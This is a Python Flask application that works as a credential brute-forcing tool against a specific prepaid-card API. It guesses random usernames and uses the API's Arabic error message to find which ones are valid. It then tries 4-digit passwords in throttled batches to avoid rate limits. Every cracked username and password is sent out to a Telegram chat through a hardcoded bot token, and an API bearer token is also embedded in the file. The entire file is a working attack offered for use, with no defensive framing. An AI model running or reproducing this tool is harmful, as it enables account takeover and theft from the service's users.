from flask import Flask, render_template, jsonify, send_file
import requests
import random
import time
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

app = Flask(__name__)

# Global variables to track progress
current_step = "Initializing"
valid_usernames = [] # Usernames found to be valid for password attempts
current_username = "" # The username currently being processed for passwords
total_requests = 0 # Total requests for the *current* operation (username scan batch or password batch)
processed_requests = 0 # Processed requests for the *current* operation
is_running = False
# success_info will hold successful attempts in memory
success_info = []

# Configuration
API_URL = "https://bc.red-radius.com/api/v1/prepaid-cards"
AUTH_HEADER = "Bearer 1|qkzMyzrJjNKSekHzcmL9QIT80pZsHRJLFp9EWyE198d26f1d"
LANGUAGE = "ar"
STATE_FILE = "bruteforce_state.json"
SUCCESS_FILE = "successes.json" # File to save successful attempts

# Telegram Configuration
BOT_TOKEN = "5540358750:AAEbbNLxeyj3IwAn90Jumy5C5a1qTbTzzM"
# The chat ID is the ID of the user you want to send the message to.
# From your provided JSON, the 'chat.id' is 962451110.
CHAT_ID = "962451110"

# --- State Management for Valid Usernames ---
def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, 'r') as f:
            try:
                state = json.load(f)
                # Return the list of valid usernames
                return state.get("valid_usernames", [])
            except json.JSONDecodeError:
                print(f"Warning: Could not decode JSON from {STATE_FILE}. Starting username state fresh.")
                return []
    return []

def save_state(valid_usernames):
    # Only save the list of valid usernames
    state = {"valid_usernames": valid_usernames}
    with open(STATE_FILE, 'w') as f:
        json.dump(state, f, indent=4)

# --- State Management for Successes ---
def load_successes():
    if os.path.exists(SUCCESS_FILE) and os.path.getsize(SUCCESS_FILE) > 0:
        try:
            with open(SUCCESS_FILE, 'r') as f:
                return json.load(f)
        except json.JSONDecodeError:
            print(f"Warning: Could not decode JSON from {SUCCESS_FILE}. Starting successes fresh.")
            return []
    return []

def save_success(success_entry):
    """Appends a new success entry to the successes file."""
    global success_info # Access the global list
    # Add to the in-memory list if it's not already there (handle potential duplicates if re-loading state)
    if not any(s['username'] == success_entry['username'] and s['password'] == success_entry['password'] for s in success_info):
        success_info.append(success_entry)

    try:
        # Save the entire updated list to the file
        with open(SUCCESS_FILE, 'w') as f:
            json.dump(success_info, f, indent=4)
    except Exception as e:
        print(f"Error saving successes to file: {e}")

# --- Telegram Notification Function ---
def send_telegram_success_notification(success_entry):
    """Sends a success notification to the configured Telegram chat."""
    message_text = f"""
🎉 Bruteforce Success Found! 🎉

*Username*: `{success_entry.get('username', 'N/A')}`
*Password*: `{success_entry.get('password', 'N/A')}`
*Status*: `{success_entry.get('status', 'N/A')}`
*Duration*: `{success_entry.get('duration', 'N/A')}`
*Remaining*: `{success_entry.get('remaining', 'N/A')}`
*Timestamp*: `{success_entry.get('timestamp', 'N/A')}`
"""
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message_text,
        "parse_mode": "MarkdownV2" # Use MarkdownV2 for formatting
    }
    try:
        response = requests.post(telegram_url, json=payload, timeout=10)
        response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
        print(f"Telegram notification sent successfully for {success_entry['username']}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending Telegram notification for {success_entry.get('username', 'N/A')}: {e}")
    except Exception as e:
        print(f"An unexpected error occurred while sending Telegram notification for {success_entry.get('username', 'N/A')}: {e}")


# --- Request Sending Function ---
def send_request(payload):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": AUTH_HEADER,
        "Accept-Language": LANGUAGE
    }
    try:
        response = requests.post(API_URL, json=payload, headers=headers, timeout=30)
        response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
        return response.json(), payload
    except requests.exceptions.RequestException as e:
        # Catch specific requests exceptions for better error handling
        # print(f"Request failed for payload {payload}: {e}") # Optional: log all request failures
        return {"error": str(e), "message": "Request failed"}, payload # Return a structured error response
    except Exception as e:
        # Catch any other unexpected errors
        print(f"An unexpected error occurred during request for payload {payload}: {e}")
        return {"error": str(e), "message": "Unexpected error"}, payload


# --- Password Brute-forcing Logic (Modified) ---
def try_passwords_batch(username, start_idx):
    """
    Tries the first 10 passwords within the range starting at start_idx.
    Passwords are 4 digits, 0000-9999.
    start_idx will be 0, 1000, 2000, ..., 9000.
    This function will test start_idx, start_idx+1, ..., start_idx+9.
    """
    global current_step, processed_requests, total_requests, success_info

    # Passwords to try in this batch (only the first 10 in the 1000-range)
    password_attempts = [str(i).zfill(4)
                         for i in range(start_idx, min(start_idx + 10, 10000))]

    total_requests = len(password_attempts)
    processed_requests = 0

    current_step = f"🔐 Trying passwords {start_idx:04d} - {min(start_idx + 9, 9999):04d} for: {username}"
    print(current_step)

    for password in password_attempts:
        payload = {"username": username, "password": password}
        result, sent_payload = send_request(payload)
        processed_requests += 1

        # Check for success message (or absence of known error message)
        # Assuming success is indicated by a message *not* being "خطأ في إسم المستخدم أو كلمة المرور" or a request error
        if result and result.get("message") not in ["خطأ في إسم المستخدم أو كلمة المرور", "Request failed", "Unexpected error"]:
             # Success found!
             success_entry = {
                 "username": username,
                 "password": password,
                 "status": result.get("status", "Success"), # Use result status if available
                 "duration": result.get("duration", "N/A"),
                 "remaining": result.get("remaining", "N/A"),
                 "timestamp": time.strftime("%Y-%m-%d %H:%M:%S") # Add timestamp
             }

             # --- Send Telegram Notification ---
             send_telegram_success_notification(success_entry)
             # ------------------------------------

             save_success(success_entry) # Save to file and update in-memory list
             current_step = f"🎉 SUCCESS found for {username} with password {password}!"
             print(current_step)
             return True # Indicate success, move to next username

        # Optional: Log other known error messages
        # elif result and result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
        #      # This is the expected error for an invalid username/password combo
        #      pass
        # elif result and result.get("message") in ["Request failed", "Unexpected error"]:
        #     print(f"API request failed for {username}/{password}: {result.get('error', 'Unknown error')}")


    # If loop finishes without finding success in this batch
    return False


# --- Background Processing Thread ---
def background_process():
    global current_step, valid_usernames, total_requests, processed_requests, is_running, current_username, success_info

    # Load existing state and successes on startup
    valid_usernames.extend(load_state()) # Add loaded usernames to current list

    # Initialize success_info global by loading the file
    success_info.extend(load_successes())

    print("Background process started.")
    print(f"Loaded {len(valid_usernames)} valid usernames from state.")
    print(f"Loaded {len(success_info)} successes from file.")


    while True:
        if is_running:
            try:
                # --- Phase 1: Scan for potential valid usernames ---
                current_step = "🔍 Scanning usernames concurrently..."
                print(current_step)
                prefix = "20" # Based on original code
                # Generate a new batch of usernames to test
                usernames_to_scan = [f"{prefix}{random.randint(100000, 999999)}" for _ in range(1000)]
                payloads = [{"username": u} for u in usernames_to_scan]
                total_requests = len(payloads)
                processed_requests = 0
                newly_found_valid_usernames_count = 0

                # Using ThreadPoolExecutor for scanning
                # Max workers potentially reduced slightly if API has strict rate limits
                with ThreadPoolExecutor(max_workers=30) as executor:
                    futures = {executor.submit(send_request, payload): payload for payload in payloads}

                    for future in as_completed(futures):
                        payload = futures[future]
                        try:
                            result, _ = future.result()
                            processed_requests += 1
                            # Identify potentially valid usernames based on the specific error message
                            if result and result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
                                username = payload["username"]
                                if username not in valid_usernames: # Avoid duplicates
                                     valid_usernames.append(username)
                                     newly_found_valid_usernames_count += 1 # Track newly found for saving
                                     # print(f"Valid username candidate found: {username}") # Optional: print candidates

                        except Exception as e:
                            print(f"Username scan request error for {payload.get('username', 'N/A')}: {e}")

                # Save state if new valid usernames were found
                if newly_found_valid_usernames_count > 0:
                     save_state(valid_usernames) # Save all valid usernames found so far
                     current_step = f"✅ Found {newly_found_valid_usernames_count} new valid usernames. Total: {len(valid_usernames)}"
                     print(current_step)
                else:
                     current_step = f"🔍 Scanned {len(usernames_to_scan)} usernames. No new valid candidates found in this batch. Total valid: {len(valid_usernames)}"
                     print(current_step)


                # --- Phase 2: Try passwords for discovered valid usernames ---
                # Iterate through the list of valid usernames.
                # Use a copy [:] to iterate in case the list is modified elsewhere (though unlikely here)
                for username in valid_usernames[:]: # Iterate over a copy
                    current_username = username
                    # Check if this username already has a success entry in the global list
                    if any(s['username'] == username for s in success_info):
                         # print(f"Skipping username {username}, success already found.")
                         continue # Skip if already successful

                    current_step = f"🔐 Starting password attempts for: {username}"
                    print(current_step)

                    # Iterate through password ranges (0-999, 1000-1999, ..., 9000-9999)
                    # try_passwords_batch will only test the first 10 in each range
                    success_for_user_found = False
                    for start_idx in range(0, 10000, 1000):
                        if try_passwords_batch(username, start_idx):
                            success_for_user_found = True
                            break # Success found for this username, move to the next valid username

                        # If no success in this batch (10 attempts), wait before the next batch (next 1000 range)
                        # print(f"No success in batch {start_idx:04d}-{min(start_idx + 9, 9999):04d} for {username}. Waiting 60s.")
                        current_step = f"🛌 Waiting 60s before trying next batch ({start_idx+1000:04d}-...) for {username}"
                        time.sleep(60)

                    if not success_for_user_found:
                         print(f"Finished all password ranges for {username} without success in this run.")


                current_step = "😴 Sleeping before next scan cycle..."
                print(current_step)
                time.sleep(600) # Sleep longer between full cycles of scanning/checking usernames


            except Exception as e:
                current_step = f"Fatal Error in background process: {str(e)}"
                print(current_step)
                # Avoid tight loop on error
                time.sleep(60)
        else:
            # App is not running, just sleep
            current_step = "🛑 Process is stopped."
            time.sleep(5)

# --- Flask Routes ---
@app.route('/')
def home():
    # The global variables valid_usernames and success_info are kept updated by the background thread.
    # Initial render values will be updated by JS status calls.
    return render_template(
        'index.html',
        current_step=current_step,
        valid_usernames=valid_usernames, # Pass the global list
        progress=(processed_requests / total_requests * 100) if total_requests > 0 else 0,
        success_info=success_info # Pass the global list
    )

@app.route('/state.json')
def get_state_file():
    """Endpoint to download the username state file."""
    if os.path.exists(STATE_FILE):
        return send_file(STATE_FILE, as_attachment=True)
    else:
        return jsonify({"error": "State file not found"}), 404

@app.route('/successes.json')
def get_success_file():
    """Endpoint to download the successes file."""
    if os.path.exists(SUCCESS_FILE):
        return send_file(SUCCESS_FILE, as_attachment=True)
    else:
        return jsonify({"error": "Successes file not found"}), 404


@app.route('/status')
def status():
    """Endpoint to get current status and data as JSON for UI updates."""
    return jsonify({
        'current_step': current_step,
        'valid_usernames': valid_usernames,
        'current_username': current_username,
        'progress': (processed_requests / total_requests * 100) if total_requests > 0 else 0,
        'is_running': is_running,
        'success_info': success_info # Include the global list of successes
    })

@app.route('/toggle')
def toggle():
    """Endpoint to start or stop the background process."""
    global is_running
    is_running = not is_running
    # Update current_step immediately to reflect the change
    if is_running:
        current_step = "▶️ Process is starting..."
        print(current_step)
    else:
        current_step = "⏸️ Process is stopping..."
        print(current_step)

    return jsonify({'is_running': is_running})

# --- Main Execution ---
if __name__ == '__main__':
    bg_thread = threading.Thread(target=background_process, daemon=True)
    bg_thread.start()
    # Run without debug for stability in production
    app.run(host='0.0.0.0', port=5000, debug=False)
